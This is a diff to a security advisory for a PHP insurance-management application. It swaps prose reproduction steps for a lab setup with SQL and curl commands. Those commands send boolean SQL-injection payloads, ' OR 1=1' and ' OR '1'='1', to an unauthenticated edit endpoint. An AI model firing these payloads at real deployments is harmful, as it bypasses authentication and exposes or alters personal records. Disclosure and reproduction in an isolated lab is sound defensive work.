@@ -45,13 +45,64 @@ Two flaws make the endpoint remotely exploitable without authentication:
 
 The following validation uses only synthetic data in an isolated laboratory deployment of commit `125362cc21dca20d74091a4913a5096bb58dd837`.
 
-1. Create a synthetic `Policy_holder` row and note its numeric `Policy_no`.
-2. Without an authenticated agent session, request `EditPolicyHolder.php` with the correct `Policy_no` and a deliberately incorrect `Name`. Confirm that the application reports that the record does not exist.
-3. Repeat the request with a harmless boolean expression appended to `Policy_no`, while keeping the deliberately incorrect `Name`.
-4. Observe that the update form is rendered with the synthetic row despite the mismatched name and the absence of an authenticated session.
-5. Repeat using a harmless boolean predicate in the string-valued `Name` parameter and a nonexistent `Policy_no`; observe the same authorization and query-control failure.
+1. Deploy the repository on PHP 7.x with MySQL or MariaDB. The original project targets Windows/XAMPP; on another platform, adjust the hard-coded include path in the test copy so it resolves to the local `database.php`.
+2. Set `BASE_URL` to the local application directory containing `index.php`, for example `http://127.0.0.1/Insurance-Management-System`.
+3. Create the local database and one synthetic row:
 
-The original public report contains the full laboratory setup and request examples. No production host, account, or data is required to reproduce the issue.
+   ```sql
+   CREATE DATABASE l7;
+   USE l7;
+   CREATE TABLE Policy_holder (
+     Policy_no INT PRIMARY KEY,
+     Name VARCHAR(255), Mobile_no VARCHAR(20), Email_id VARCHAR(255),
+     City VARCHAR(255), Colony VARCHAR(255), House_no VARCHAR(255),
+     Pincode VARCHAR(20), Nominee_name VARCHAR(255),
+     Nominee_relation VARCHAR(255), Gender VARCHAR(10),
+     Occupation VARCHAR(255), DOB DATE, Edu_ql VARCHAR(255), AGE INT
+   );
+   INSERT INTO Policy_holder VALUES
+   (100000001, 'John Doe', '9000000000', 'john@test.local',
+    'Pune', 'Colony A', '12', '411001', 'Jane Doe', 'Spouse',
+    'MALE', 'Engineer', '1989-06-15', 'B.E.', 35);
+   ```
+
+4. Confirm the baseline row:
+
+   ```sql
+   SELECT Policy_no, Name, Email_id, City
+   FROM Policy_holder WHERE Policy_no = 100000001;
+   ```
+
+5. Without creating a PHP session, first send a normal synthetic update request to establish the lab baseline:
+
+   ```bash
+   curl -sS -i \
+     -d 'Policy_no=100000001&Name=John%20Doe&Mobile_no=9000000000&Email_id=john%40test.local&City=Pune&Colony=Colony%20A&House_no=12&Pincode=411001&Nominee_name=Jane%20Doe&Nominee_relation=Spouse&Gender=MALE&Occupation=Engineer&DOB=1989-06-15&Edu_ql=B.E.&submit=1' \
+     "$BASE_URL/Agent/includes/UpdatePolicyHolder-inc.php" \
+     | rg -i '^Location:'
+   ```
+
+6. Without creating a PHP session, send a harmless boolean test to the local handler. Use a test-only value; do not include production data:
+
+   ```bash
+   curl -sS -i \
+     -d 'Policy_no=100000001%20OR%201=1&Name=NotTheCanary&submit=1' \
+     "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
+     | sed -n '1,25p'
+   ```
+
+7. Observe that the handler continues after the unauthenticated redirect and renders or processes the synthetic record instead of terminating at the authentication guard.
+8. Repeat with a string-context boolean canary against the local copy:
+
+   ```bash
+   curl -sS -i \
+     -d "Policy_no=999999999&Name=' OR '1'='1&submit=1" \
+     "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
+     | sed -n '1,25p'
+   ```
+
+9. Verify the synthetic row and confirm that no real record was touched. The expected vulnerable signal is that query-controlled input bypasses the intended record check while no authenticated agent session exists.
+10. Stop after confirming the boolean behavior. Do not use `UNION`, file-read, stacked-query, destructive, or data-extraction payloads in a public or production environment.
 
 
 ### Impact
